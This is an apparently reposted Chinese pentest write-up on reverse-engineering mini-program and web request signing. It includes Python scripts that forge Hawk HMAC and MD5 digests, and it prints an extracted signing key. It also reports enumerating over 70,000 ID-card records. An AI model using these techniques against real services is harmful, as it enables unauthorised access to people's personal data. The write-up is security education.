---
title: 手把手拆解：小程序/Web端加密鉴权绕过案例全复现
url: https://mp.weixin.qq.com/s/gJU7m_XbvfBzGaaVDzsZLg
source: Doonsec's feed
date: 2026-03-24
fetch_date: 2026-03-25T04:13:59.432984
---

# 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JnmoqeNZZwTjUibY8iceCNkRCoCic7nsN8BvFj7PRRUvuIWkyUJ9XgallDzJ26WxMfzKcI1jLLUrSHC6BzuuicVBtiaiaJlQeS8f3gkviacnNEgNibI/0?wx_fmt=jpeg)

# 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

Z2O安全攻防

![]()

在小说阅读器中沉浸阅读

以下文章来源于亿人安全
，作者Werqy3

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7P6QhEtne4ElK29ATrgstibwthblEw9OciaJSBtquvAEKA/0)

**亿人安全**
.

知其黑，守其白。手握利剑，心系安全。主要研究方向包括：Web、内网、红蓝对抗、代码审计、安卓逆向、CTF。

本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管

本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管。

# 案例一

某天对小程序进行登录时发现登录进去这个接口有个personalid参数，发现也是返回了个人信息，一开始还以为是一个改id进行越权的简单漏洞，但是当我再次发包以后显示时间ts有问题，改了ts以后又说nonce有问题，到最后改了nonce，发现mac又有问题，这里就大概了解了大概的一个鉴权（ts，nonce要变化）

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibXwiaJ0emwpUBibq5JeiaREqpVB16eMh090TTP1sobPNO4WkBQvKfohHPzeW3mG9bqDJVNSVcw7fhMvbD7zphMdgicCVuLvmCiaycE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icpXF7yaPO16gwh5QXe7xzhqdjmqLhzmYibBGg3037hDqNBheD5wgvNDbSKZm1wbia9AGliaZib5C358MGiaZysUtPa4XKtHbZ3Es98/640?wx_fmt=png&from=appmsg)

到这里就可以发现是mac参数进行的鉴权，由于是小程序，所以反编译一下源码

这里全局搜一下mac

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49WVic40mFdPADWe4dSmPNIS1dW17eCR1Wl0G3SbNwduG1jo6wic0QoepIYmmibRvuS7ZsvDzTgwqZ9oY6WYTIFRXf7oEkzZsOp28/640?wx_fmt=png&from=appmsg)

代码如下：

```
var o = {
                    ts: a,
                    nonce: i.nonce || e.utils.randomString(6),
                    method: n,
                    resource: r.resource,
                    host: r.host,
                    port: r.port,
                    hash: i.hash,
                    ext: i.ext,
                    app: i.app,
                    dlg: i.dlg
                },
                c = e.crypto.calculateMac("header", s, o),
                h = 'Hawk id="' + s.id + '",ts="' + o.ts + '",nonce="' + o.nonce + '",mac="' + c + '"';
```

这里的o是ts,nonce,method,resource,host,port这些组合起来的

可以看见mac是等于c的，其实就是请求方式和url及认证头里面的东西组合起来进行了一个加密

跟进一下e.crypto.calculateMac

全局搜索

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibat0jo87UK87W59TTVIia6a2q37dibfQlCg5icZDTFTlhOHNgXhxpdauLOgqJ8HX9dNMNEUbl9vRx3AAfV7xpTbicuXxAxgxpFBRQ/640?wx_fmt=png&from=appmsg)

加密逻辑

```
e.crypto = {
        headerVersion: "1",
        algorithms: ["sha1", "sha256"],
        calculateMac: function(t, r, n) {
var i = e.crypto.generateNormalizedString(t, n);
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
        }
```

这里对`calculateMac`函数分析，这个函数是该对象的核心，它接受三个参数：

* `t`

  : **原始数据**。
* `r`

  : **包含算法和密钥的对象**。这个对象内部有 `r.algorithm`（指定哈希算法，例如`"sha1"`或`"sha256"`) 和 `r.key`（用于HMAC计算的密钥）。
* `n`

  : 也就是o。

```
var i = e.crypto.generateNormalizedString(t, n);
```

* 首先，调用 `e.crypto.generateNormalizedString`函数，传入 `t`和 `n`参数。
* 这个函数将上一步准备好的 `o`对象（以及其他输入，如 `t`）按照 Hawk 协议的特定规则进行**排序**和**拼接**，生成一个唯一的、标准化的字符串。这样的话就确保不管数据在原始对象中的顺序如何，只要内容不变，生成的标准化字符串就始终一致。这对于**防止因数据顺序不一致而导致的签名验证失败**

```
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
```

* 这行代码是实际进行HMAC计算和格式化的部分。
* `r.algorithm.toUpperCase()`

  : 将传入的算法名称转换为大写，例如 `sha1`变为 `SHA1`。
* `"Hmac" + r.algorithm.toUpperCase()`

  : 动态构建HMAC算法名称，例如 `"HmacSHA1"`或 `"HmacSHA256"`。
* `s["Hmac..."](i, r.key)`

  : 使用标准化字符串 `i`和密钥 `r.key`来调用 HMACC 算法进行计算，返回一个HMAC结果。
* `.toString(s.enc.Base64)`

  : 将计算出的HMAC结果转换为**Base64编码**的字符串，并作为函数的最终返回值。

这里就需要找到key了

一开始全局搜索key但是太多了

然后联想到一般key都会放在配置文件里面

搜了一下config

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ib11IfAvSiaoyPyWTBDvRF2ZrU0cFiaScIg1r6AW1sodqUJCUyXKlEbHW7uvKpsGpicypToy6OItPLuAHgUE8ApfQpPaMy1ZVzeKQ/640?wx_fmt=png&from=appmsg)

写个脚本试一下能不能使用

```
import base64
import hmac
import hashlib
import time

def generate_normalized_string(header_type, artifacts):
"""生成 Hawk 规范化字符串"""
    n = f"hawk.1.{header_type}\n"
    n += f"{artifacts['ts']}\n"
    n += f"{artifacts['nonce']}\n"
    n += f"{artifacts['method'].upper()}\n"
    n += f"{artifacts['resource']}\n"
    n += f"{artifacts['host'].lower()}\n"
    n += f"{artifacts['port']}\n"
    n += f"{artifacts['hash']}\n"# 空字符串

# 无 ext 参数
    n += "\n"

# 无 app 和 dlg 参数
return n

def calculate_mac(credentials, artifacts):
"""计算 Hawk MAC 值"""
    normalized_str = generate_normalized_string("header", artifacts)

print("规范化字符串:")
print("----------------------")
print(normalized_str)
print("----------------------")

    key_bytes = credentials["key"].encode("utf-8")
    msg_bytes = normalized_str.encode("utf-8")

# 使用 SHA-256
    hmac_digest = hmac.new(key_bytes, msg_bytes, hashlib.sha256).digest()
return base64.b64encode(hmac_digest).decode("utf-8")

# 输入参数
credentials = {
"id": "wasx",
"key": "edb8bc95-a000-4ca0-81b8-dd2145050a70F61FB1981510CE5D3988193864A328A3",
"algorithm": "sha256"
}

timestamp = time.time()
timestamps=int(timestamp)
artifacts = {
"ts": timestamps,
"nonce": "6a0d5d576135004ead6cf4795e5b6112",        "method": "GET",
"resource": "xxxx/List/QueryByPersonalid?personalid=668223",
"host": "xxxxxxx",
"port": "443",
"hash": ""
}

# 计算并验证 MAC
calculated_mac = calculate_mac(credentials, artifacts)

print(f"计算 MAC: {calculated_mac}")
```

发现可以使用，后续也是遍历了7w+的sfz信息

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibMcaMISUy9D3MCicKx46upzX4Htz0qOgWG17LbGzZu4lYYQZ4JIKaMnJmcFwT6vEWlFGicPpiaiceTqHNiblibTF17G0OwoFTjZPC5w/640?wx_fmt=png&from=appmsg)

# 案例二

这里是一个预约功能的地方，需要填写个人信息包括了身份证号，可以看见有个personCode参数，后面跟了一串数字，然后下滑可以发现返回了个人信息，原本想遍历一下这个参数的，但是说参数过期了，想都不要想肯定是digest加密导致的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icLKh1hkuveDZxJQqezxViaP1zK2247HGkLdodEfBvsVKvO1xWmwKIUpXdicXDn0gMClS65icg2BGaeCLBiac6g2tribm7WMuyspMro/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibl3QvdGBhD6Oibg6TD5InVxU0vM1rj2WmwPo7nKvm2yMY9jjibmic0WfPsCQ8Vc6wVy7pGuqXspDomkPgicsFbhHX1FaPAUNVokxc/640?wx_fmt=png&from=appmsg)

一样的方法反编译一下

找到加密地方

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48XTWOicgNCIb4saMJMSF1RbIbv6bVtkz5go6vy5tcQFORa26wBzYvW5lWohFdpQuHOv3UJP1Amg42z1yymZFYtQy2Qadr5nesk/640?wx_fmt=png&from=appmsg)

这个就比较简单了，只有有个hexMD5加密

简单分析一下代码

```
var n = a.domainUrl(o.domain).match(/[^\/]+$/)[1]
```

这个正则表达式是匹配字符串末尾的非斜杠字符。例如，如果 `a.domainUrl(o.domain)`返回 "https://example.com/api"，那么它会匹配 "api"

```
u = o.url.includes("?") ? o.url.split("?")[0] : o.url
```

* 这行代码处理 URL，去除查询参数。
* `o.url.includes("?")`

  ：检查 `o.url`字符串是否包含问号 `?`。
* `o.url.split("?")[0]`

  ：如果包含 `?`，则用 `?`分割 URL 字符串，并取第一个部分，即问号之前的部分。

```
digest: t.hexMD5("/".concat(n, "/") + u + s).toUpperCase()
```

* `"/".concat(n, "/")`

  ：将字符串 `n`用斜杠包裹起来。例如，如果 `n`是 "api"，结果就是 "/api/"。
* `+ u + s`

  ：将上一步的结果、不带参数的 URL `u`和时间戳 `s`拼接在一起。
* `t.hexMD5(...)`

  ：调用一个名为 `t`的对象上的 `hexMD5`方法，对拼接后的字符串进行 MD5 哈希计算。MD5 是一种常见的哈希算法，用于生成一个唯一的、固定长度的散列值。
* `.toUpperCase()`

  ：将生成的 MD5 散列值转换为大写。

分析完毕，开始写脚本：

```
import re
import hashlib
import time

def calculate_digest(domain, url, timestamp):
# 提取domain的最后路径片段
match = re.search(r'\/([^\/]+)\/?$', domain)
if not match:
        raise ValueError("Invalid domain format")
    n = match.group(1)
# 去掉URL的查询参数
    u = url.split('?', 1)[0]
# 拼接字符串
    s = f"/{n}/{u}{timestamp}"
# 计算MD5并转大写
return hashlib.md5(s.encode('utf-8')).hexdigest().upper()

# 示例调用
if __name__ == "__main__":
    domain = 'xxxxx'
    url = 'xxxxx'
    timestamp = int(time.time() * 1000)  # 获取毫秒级时间戳
print("Timestamp:", timestamp)
    digest = calculate_digest(domain, url, timestamp)
print("digest:", digest)
```

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ickE8ypvxIRJx7YRoFBcicLKKuicmmmfvyD2cenPuxx2eD6bwxnia3hyEBcogsibPWsb8bnZ3aRwJza8iaBXyFciaVWnG8cFPbxpshIw/640?wx_fmt=png&from=appmsg)

# 案例三

这里说一下快速找到加密点的方法

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49cxPWEFwRktrWLanRWEtC8mzOE6icK5d7RicicicIK1NcchPmpM1mrEXMal6Slw0vsLeiaV5QKqOfqvqeNfZrT4jf7aiaWJprzibf6nk/640?wx_fmt=png&from=appmsg)

xhr打断点进行定位加密，选一个标志性的进行定位

![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ib1UUzn4CcBD9E99j5BFuxicib5xVXnD2lUR3YaRDxM4CNIgibWmsjcTt5ibPHpX1zy93hwHzhFLApWtTqaK2KQGcicF7UELiccYPq0M/640?wx_fmt=png&from=appmsg)
...